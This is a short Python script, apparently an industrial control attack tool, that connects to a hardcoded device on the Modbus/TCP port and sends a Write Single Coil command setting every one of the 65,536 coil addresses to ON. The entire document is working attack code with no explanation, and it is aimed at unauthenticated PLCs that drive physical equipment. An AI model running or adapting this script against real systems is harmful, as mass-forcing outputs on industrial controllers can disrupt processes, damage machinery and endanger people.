#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author:Z-0ne

import os, sys, time, socket, binascii
targetip = '192.168.0.115'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((targetip,502))
Transaction_Identifier = '\x00\x00'
Protocol_Identifier = '\x00\x00'
Protocol_Length = '\x00\x06'
Unit_Identifier = '\x01'
Fun_Code = '\x05'
Wirtedata = '\xff\x00'
for i in range(0,65536):
    HRaddress = "%04x"%(i)
    HRaddress_pack = binascii.a2b_hex(HRaddress)
    modbus_fuc_05 = Transaction_Identifier + Protocol_Identifier + Protocol_Length +\
                    Unit_Identifier + Fun_Code + HRaddress_pack +  Wirtedata
    s.send(modbus_fuc_05)
    modbus_msg = s.recv(1024)
    print i
